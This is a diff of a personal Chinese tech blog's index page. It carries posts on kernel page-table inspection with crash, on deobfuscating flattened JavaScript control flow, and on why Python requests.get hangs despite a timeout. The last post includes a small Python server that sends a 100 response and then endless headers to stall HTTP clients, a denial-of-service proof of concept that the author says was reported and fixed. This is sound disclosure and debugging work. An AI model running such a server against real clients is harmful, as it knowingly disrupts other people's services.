1</span><br><span class="line">  STATE: TASK_INTERRUPTIBLE</span><br><span class="line">crash&gt; px 139812061335552  &#x2F;&#x2F; 十进制转成十六进制。139812061335552是mmap的返回值</span><br><span class="line">$1 &#x3D; 0x7f2888405000</span><br><span class="line">crash&gt; vtop 0x7f2888405000  &#x2F;&#x2F; vtop指令用来查看&quot;虚拟地址&quot;对应的&quot;物理地址&quot;</span><br><span class="line">VIRTUAL     PHYSICAL</span><br><span class="line">7f2888405000  (not mapped)  &#x2F;&#x2F; 这里可以看出来，此时没有映射到对应的&quot;物理地址&quot;</span><br><span class="line"></span><br><span class="line">   PGD: 16abd67f0 &#x3D;&gt; 16b7d7067</span><br><span class="line">   PUD: 16b7d7510 &#x3D;&gt; 170f95067</span><br><span class="line">   PMD: 170f95210 &#x3D;&gt; 160fd5067</span><br><span class="line">   PTE: 160fd5028 &#x3D;&gt; 0      &#x2F;&#x2F; &quot;页表项&quot;为0，其中的P标志位为0，表示&quot;页表项&quot;不存在，没有映射到对应的&quot;物理地址&quot;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">crash&gt; vtop 0x7f2888405000</span><br><span class="line">VIRTUAL     PHYSICAL</span><br><span class="line">7f2888405000  117d65000</span><br><span class="line">....</span><br><span class="line">   PTE: 160fd5028 &#x3D;&gt; 8000000117d65225</span><br><span class="line">  PAGE: 117d65000</span><br><span class="line"></span><br><span class="line">      PTE         PHYSICAL   FLAGS</span><br><span class="line">8000000117d65225  117d65000  (PRESENT|USER|ACCESSED|NX)   &#x2F;&#x2F; 此时&quot;页表项&quot;有了映射关系，说明此时只能读不能写</span><br><span class="line"></span><br><span class="line">crash&gt; vtop 0x7f2888405000</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">      PTE         PHYSICAL   FLAGS</span><br><span class="line">80000003b0cf5867  3b0cf5000  (PRESENT|RW|USER|ACCESSED|DIRTY|NX)    &#x2F;&#x2F; RW标志表明此时可以写</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p>如上面指令结果中的注释：执行三次vtop指令时，页表项(PTE)中的”FLAGS”都不断变化，读写权限确实像”问题背景”中那样变化。可以看出来，结论是没有问题的</p>
-<p>怎么样，crash验证这个结论是不是很简单？</p>
-</li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>crash很好用，如果你想了解更多crash工具的应用场景，可以参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/040W19-CPF0VnUvwFSKiXw">解决Linux内核问题实用技巧之 - Crash工具结合/dev/mem任意修改内存</a></p>
 
       
     </div>
@@ -887,6 +777,247 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%8F%8D%E6%B7%B7%E6%B7%86%22%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96%22/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E5%8F%8D%E6%B7%B7%E6%B7%86%22%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96%22/" class="post-title-link" itemprop="url">反混淆"控制流平坦化"</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>业务逻辑非常依赖前端的安全产品，比如<a target="_blank" rel="noopener" href="https://www.geetest.com/">极验</a>、<a target="_blank" rel="noopener" href="https://www.dingxiang-inc.com/docs/detail/captcha">顶象-无感验证</a>、瑞数 等都会对前端代码做混淆。其中有一种强度较高的混淆方式，叫”控制流平坦化”。</p>
+<blockquote>
+<p>“控制流平坦化”是将一些顺序执行的代码，变化成阅读难度更大的<code>while-switch-case</code>或者<code>for-switch-case</code>代码。可以见<a target="_blank" rel="noopener" href="https://github.com/Tsaiboss/ControlFlow">ControlFlow</a>这个项目的例子。</p>
+</blockquote>
+<p>如果能够”反混淆”这种”控制流平坦化”混淆后的代码，就能让代码变得更容易阅读一些。</p>
+<p>本文介绍”反控制流平坦化”的思路和实践过程，最终可以反混淆<code>ControlFlow</code>和<code>https://obfuscator.io/</code>两个工具的”控制流平坦化”。</p>
+<p>反混淆思路：</p>
+<ul>
+<li>按照”while-switch-case”执行顺序，拼接case语句</li>
+</ul>
+<h1 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h1><ul>
+<li><p>怎么实现？</p>
+<p>分为两步：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 第一步获取case块的执行顺序</span><br><span class="line">* 第二部根据case块的执行顺序，拼接case块</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>怎么获取”case块的执行顺序”？</p>
+<p>思路是在每个case块中”注入代码”，然后在浏览器中执行js代码，执行过程”注入代码”就可以记录执行顺序。我理解这个类似”软件测试”中计算”代码覆盖率”时用到的插桩。</p>
+<p>原始代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">while (!![])&#123;</span><br><span class="line">  switch (...)&#123;</span><br><span class="line">    case &quot;0&quot;:</span><br><span class="line">      ...</span><br><span class="line">    case &quot;1&quot;:</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>插桩后,代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 利用&quot;插桩&quot;记录while-switch-case执行顺序</span><br><span class="line">&#x2F;&#x2F; 集合 &#x3D; &#123;while id: [case1节点, case2节点，case3节点，case2节点]&#125;</span><br><span class="line"></span><br><span class="line">let while_id_stack &#x3D; []  &#x2F;&#x2F; 栈</span><br><span class="line"></span><br><span class="line">let collection &#x3D; &#123;&#125;</span><br><span class="line"></span><br><span class="line">while (!![])&#123;</span><br><span class="line">  while_statement_id &#x3D; 111</span><br><span class="line">  while_id_stack.push(while_statement_id)</span><br><span class="line">  collection[while_statement_id] &#x3D; []</span><br><span class="line"></span><br><span class="line">  switch (...)&#123;</span><br><span class="line">    case &quot;0&quot;:</span><br><span class="line">      case_statement_id &#x3D; 222</span><br><span class="line">      while_id_on_stack_op &#x3D; while_id_stack[while_id_stack.length-1]</span><br><span class="line">      collection[while_id_on_stack_op].push(case_statement_id)</span><br><span class="line">      ...</span><br><span class="line">    case &quot;1&quot;:</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  while_id_stack.pop()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">record(collection)</span><br></pre></td></tr></table></figure>
+
+<p>浏览器运行后，集合中就存放有case节点的执行顺序。</p>
+<p>上面都是伪代码，具体实现见 hook.js</p>
+</li>
+<li><p>怎么拼接case块？</p>
+<p>伪代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">集合 &#x3D; &#123;while id: [case1节点, case2节点，case3节点，case2节点]&#125;</span><br><span class="line"></span><br><span class="line">函数1：</span><br><span class="line"></span><br><span class="line">  遍历ast，如果遇到while语句 &#123;</span><br><span class="line">    得到当前while id</span><br><span class="line"></span><br><span class="line">    if while id in 集合:</span><br><span class="line">      顺序拼接各个case块内容</span><br><span class="line"></span><br><span class="line">      用&quot;拼接后的顺序语句&quot;替换&quot;while语句&quot;</span><br><span class="line"></span><br><span class="line">      从集合中删除 while id记录</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">while 集合中还有元素:</span><br><span class="line"></span><br><span class="line">  调用 函数1</span><br></pre></td></tr></table></figure>
+
+<p>具体实现见 simple_decode.js</p>
+</li>
+</ul>
+<h1 id="实现结果"><a href="#实现结果" class="headerlink" title="实现结果"></a>实现结果</h1><p>可以将”while-switch-case代码块”变成”顺序执行的代码块”。</p>
+<p>比如 PlayWithObfuscator/tests/encoded_js/simple.js 中的混淆后的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">while (!![]) &#123;</span><br><span class="line">    switch (_0xcgcd3c[_0x3922ce++]) &#123;</span><br><span class="line">        case &quot;0&quot;:</span><br><span class="line">            if (_0x33g15b &#x3D; _0x5153cd.charCodeAt(_0xeea791 +&#x3D; .75), _0x33g15b &gt; 255) throw new t(&quot;&#39;btoa&#39; failed: The string to be encoded contains characters outside of the Latin1 range.&quot;);</span><br><span class="line">            continue;</span><br><span class="line"></span><br><span class="line">        case &quot;1&quot;:</span><br><span class="line">            _0xed1fcd &#x3D; _0xed1fcd &lt;&lt; 8 | _0x33g15b;</span><br><span class="line">            continue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>转换成 阅读性更好一些的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (_0x33g15b &#x3D; _0x5153cd.charCodeAt(_0xeea791 +&#x3D; .75), _0x33g15b &gt; 255) throw new t(&quot;&#39;btoa&#39; failed: The string to be encoded contains characters outside of the Latin1 range.&quot;);</span><br><span class="line">_0xed1fcd &#x3D; _0xed1fcd &lt;&lt; 8 | _0x33g15b;</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>目前属于demo阶段，可以对以下工具的”控制流平坦化”做反混淆：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://obfuscator.io/">https://obfuscator.io/</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Tsaiboss/ControlFlow">https://github.com/Tsaiboss/ControlFlow</a></li>
+</ul>
+<p>测试结果在 <a target="_blank" rel="noopener" href="https://github.com/leveryd/PlayWithObfuscator/tree/main/tests">tests目录</a> 看到</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a314131070/article/details/106567825?spm=1001.2014.3001.5501">JS反混淆-控制流平展（一）</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-requests.get%E5%8D%A1%E4%BD%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-requests.get%E5%8D%A1%E4%BD%8F/" class="post-title-link" itemprop="url">requests.get卡住</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>之前线上的漏洞扫描遇到一个奇怪的问题:requests.get即使设置了timeout，仍然卡住。</p>
+<p>看lijiejie大佬 <a target="_blank" rel="noopener" href="http://www.lijiejie.com/requests-get-hang/">requests.get 异常hang住</a> 也碰到过这个问题。</p>
+<p>所以，我想要探究以下问题:</p>
+<ul>
+<li>requests库中timeout参数的具体含义是什么?</li>
+<li>为什么requests.get时timeout参数”失效”?</li>
+</ul>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="requests库中timeout参数的具体含义是什么"><a href="#requests库中timeout参数的具体含义是什么" class="headerlink" title="requests库中timeout参数的具体含义是什么?"></a>requests库中timeout参数的具体含义是什么?</h2><ul>
+<li><p>requests库中timeout参数是什么?</p>
+<p>根据<a target="_blank" rel="noopener" href="https://docs.python-requests.org/en/master/user/advanced/#timeouts">官网文档</a>所说,timeout可以表示(connect超时时间,read超时时间)</p>
+</li>
+<li><p>什么是connect超时?</p>
+<p>客户端需要connect系统调用来和服务端做tcp三次握手，当服务地址在互联网上不存在时，connect系统调用耗时就会比较长。</p>
+<p>比如请求1.1.2.3 过一段时间后会返回一个connect tiemout:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import requests;requests.get(&quot;http:&#x2F;&#x2F;1.1.2.3&quot;)&#39;</span><br></pre></td></tr></table></figure>
+
+<p>在上面请求1.1.2.3这个不存在的ip时，客户端发出的 syn 包没有任何响应，于是客户端会重传syn包</p>
+<ul>
+<li>重传次数在 /proc/sys/net/ipv4/tcp_syn_retries 可以配置</li>
+<li>重传间隔时间并不是固定的，在Linux系统上测试结果是 [1,3,7,15,31]s，似乎就是 2^(n+1)-1</li>
+</ul>
+<p>如果重试完后仍然没有收到ack包，就会出现connect timeout</p>
+<p>而request的timeout参数就可以减少这个等重传的时间。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import requests;requests.get(&quot;http:&#x2F;&#x2F;1.1.2.3&quot;, timeout&#x3D;(1, 100))&#39; # 1s的connect超时设置</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>怎么实现的connect超时控制?</p>
+<p>connect、read等系统调用是没有参数可以控制超时时间的，那connect超时控制是怎么实现的呢?</p>
+<p>在Modules/socketmodule.c可以找到connect函数的实现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. socket设置成非阻塞模式</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">sock_call_ex(...,_PyTime_t timeout) &#123;</span><br><span class="line">  ...</span><br><span class="line">  interval &#x3D; timeout;</span><br><span class="line">  ...</span><br><span class="line">  res &#x3D; internal_select(s, writing, interval, connect);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int internal_select(PySocketSockObject *s, int writing, _PyTime_t interval,</span><br><span class="line">            int connect)&#123;</span><br><span class="line">  ...</span><br><span class="line">  ms &#x3D; _PyTime_AsMilliseconds(interval, _PyTime_ROUND_CEILING);</span><br><span class="line">  ...</span><br><span class="line">  n &#x3D; poll(&amp;pollfd, 1, (int)ms);  2. poll系统调用，如果超时,poll系统调用就会返回</span><br></pre></td></tr></table></figure>
+
+<p>流程如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 设置socket为非阻塞模式后，调用connect系统调用</span><br><span class="line">* 使用poll系统调用来判断是否超时</span><br></pre></td></tr></table></figure>
+
+<p>实际上这是一种很通用的对connect做超时控制的方式，在其他tcp客户端中也可以这么实现超时控制。</p>
+</li>
+<li><p>什么是read超时?</p>
+<p>客户端需要调用read系统调用来读取服务端发送的数据，如果服务端一直不发送数据，读数据时就会卡住。</p>
+<p>比如我们用nc命令开启一个服务端只负责监听建立链接,不发送数据.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 8081</span><br></pre></td></tr></table></figure>
+<p>客户端请求nc开启的服务,代码如下,3s后会出现读超时</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:8081&quot;, timeout&#x3D;(1,3)) # read超时时间设置成3s</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="为什么requests-get时timeout参数”失效”"><a href="#为什么requests-get时timeout参数”失效”" class="headerlink" title="为什么requests.get时timeout参数”失效”?"></a>为什么requests.get时timeout参数”失效”?</h2><p>  requests.get在 dns解析、connect、read 这些阶段都有可能耗时比较久。下面分别说一下timeout在这三个阶段中是否生效。</p>
+<p>  文档中只说了timeout控制connect、read两个阶段，说明dns解析耗时很久时timeout是管不了的。<br>  我自己实验，也得出相同的结论：dns解析时间即使超过timeout，也不会抛出异常。</p>
+<p>  connect阶段在上面已经分析过，timeout是可以控制这一阶段最多花费多长时间的。</p>
+<p>  Python中的read超时不是一个全局的时间，它只是在每一次读socket时不能超过这个时间。而一次响应的读取可能有多次read操作。这儿可能和其他的http客户端（比如curl）等超时时间含义不同。</p>
+<p>  如果服务端能够让客户端read非常多次，且每一次时间都不超过read timeout值，这个时候客户端会卡住。</p>
+<p>  所以，在下面两种情况下是会造成read timeout参数“失效”的:</p>
+<ul>
+<li><p>响应中content-length是一个特别大的数，服务端缓慢的每次响应1字节</p>
+</li>
+<li><p>服务端返回的响应码是100，同时服务端持续不断地返回响应头，也会导致客户端持续不断的read</p>
+<p>比如下面的服务端持续不断地返回响应头，会导致客户端卡住。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">from socket import *</span><br><span class="line">from multiprocessing import *</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">def dealWithClient(newSocket,destAddr):</span><br><span class="line">    recvData &#x3D; newSocket.recv(1024)</span><br><span class="line">    newSocket.send(b&quot;&quot;&quot;HTTP&#x2F;1.1 100 OK\n&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        # recvData &#x3D; newSocket.recv(1024)</span><br><span class="line">        newSocket.send(b&quot;&quot;&quot;x:a\n&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">        if len(recvData)&gt;0:</span><br><span class="line">            # print(&#39;recv[%s]:%s&#39;%(str(destAddr), recvData))</span><br><span class="line">            pass</span><br><span class="line">        else:</span><br><span class="line">            print(&#39;[%s]close&#39;%str(destAddr))</span><br><span class="line">            sleep(10)</span><br><span class="line">            print(&#39;over&#39;)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    # newSocket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    serSocket &#x3D; socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    serSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR  , 1)</span><br><span class="line">    localAddr &#x3D; (&#39;&#39;, 8085)</span><br><span class="line">    serSocket.bind(localAddr)</span><br><span class="line">    serSocket.listen(5)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            newSocket,destAddr &#x3D; serSocket.accept()</span><br><span class="line"></span><br><span class="line">            client &#x3D; Process(target&#x3D;dealWithClient, args&#x3D;(newSocket,destAddr))</span><br><span class="line">            client.start()</span><br><span class="line"></span><br><span class="line">            newSocket.close()</span><br><span class="line">    finally:</span><br><span class="line">        serSocket.close()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>更多的讨论可以见提交的bug <a target="_blank" rel="noopener" href="https://bugs.python.org/issue44022">urllib http client possible infinite loop on a 100 Continue response</a></p>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>请求在 dns解析、connect、read 这些阶段都有可能耗时很久，其中：</p>
+<ul>
+<li>dns解析阶段 不受timeout参数控制</li>
+<li>connect阶段 受timeout参数控制</li>
+<li>read阶段 timeout不是全局的，如果服务端让客户端有很多次read操作，就有可能让客户端卡住</li>
+</ul>
+<p>阻塞时的connect系统调用是有默认的最大时间限制，这个和系统配置有关；可以用”非阻塞connect+select/poll”来实现connect的超时控制。</p>
+<p>在排查这个case原因时，发现这里存在潜在的dos攻击问题，也上报给Python官方，很快被修复了。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-webshell%E6%A3%80%E6%B5%8B%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1048,137 +1179,6 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-requests.get%E5%8D%A1%E4%BD%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-requests.get%E5%8D%A1%E4%BD%8F/" class="post-title-link" itemprop="url">requests.get卡住</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>之前线上的漏洞扫描遇到一个奇怪的问题:requests.get即使设置了timeout，仍然卡住。</p>
-<p>看lijiejie大佬 <a target="_blank" rel="noopener" href="http://www.lijiejie.com/requests-get-hang/">requests.get 异常hang住</a> 也碰到过这个问题。</p>
-<p>所以，我想要探究以下问题:</p>
-<ul>
-<li>requests库中timeout参数的具体含义是什么?</li>
-<li>为什么requests.get时timeout参数”失效”?</li>
-</ul>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="requests库中timeout参数的具体含义是什么"><a href="#requests库中timeout参数的具体含义是什么" class="headerlink" title="requests库中timeout参数的具体含义是什么?"></a>requests库中timeout参数的具体含义是什么?</h2><ul>
-<li><p>requests库中timeout参数是什么?</p>
-<p>根据<a target="_blank" rel="noopener" href="https://docs.python-requests.org/en/master/user/advanced/#timeouts">官网文档</a>所说,timeout可以表示(connect超时时间,read超时时间)</p>
-</li>
-<li><p>什么是connect超时?</p>
-<p>客户端需要connect系统调用来和服务端做tcp三次握手，当服务地址在互联网上不存在时，connect系统调用耗时就会比较长。</p>
-<p>比如请求1.1.2.3 过一段时间后会返回一个connect tiemout:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import requests;requests.get(&quot;http:&#x2F;&#x2F;1.1.2.3&quot;)&#39;</span><br></pre></td></tr></table></figure>
-
-<p>在上面请求1.1.2.3这个不存在的ip时，客户端发出的 syn 包没有任何响应，于是客户端会重传syn包</p>
-<ul>
-<li>重传次数在 /proc/sys/net/ipv4/tcp_syn_retries 可以配置</li>
-<li>重传间隔时间并不是固定的，在Linux系统上测试结果是 [1,3,7,15,31]s，似乎就是 2^(n+1)-1</li>
-</ul>
-<p>如果重试完后仍然没有收到ack包，就会出现connect timeout</p>
-<p>而request的timeout参数就可以减少这个等重传的时间。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import requests;requests.get(&quot;http:&#x2F;&#x2F;1.1.2.3&quot;, timeout&#x3D;(1, 100))&#39; # 1s的connect超时设置</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>怎么实现的connect超时控制?</p>
-<p>connect、read等系统调用是没有参数可以控制超时时间的，那connect超时控制是怎么实现的呢?</p>
-<p>在Modules/socketmodule.c可以找到connect函数的实现</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. socket设置成非阻塞模式</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">sock_call_ex(...,_PyTime_t timeout) &#123;</span><br><span class="line">  ...</span><br><span class="line">  interval &#x3D; timeout;</span><br><span class="line">  ...</span><br><span class="line">  res &#x3D; internal_select(s, writing, interval, connect);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int internal_select(PySocketSockObject *s, int writing, _PyTime_t interval,</span><br><span class="line">            int connect)&#123;</span><br><span class="line">  ...</span><br><span class="line">  ms &#x3D; _PyTime_AsMilliseconds(interval, _PyTime_ROUND_CEILING);</span><br><span class="line">  ...</span><br><span class="line">  n &#x3D; poll(&amp;pollfd, 1, (int)ms);  2. 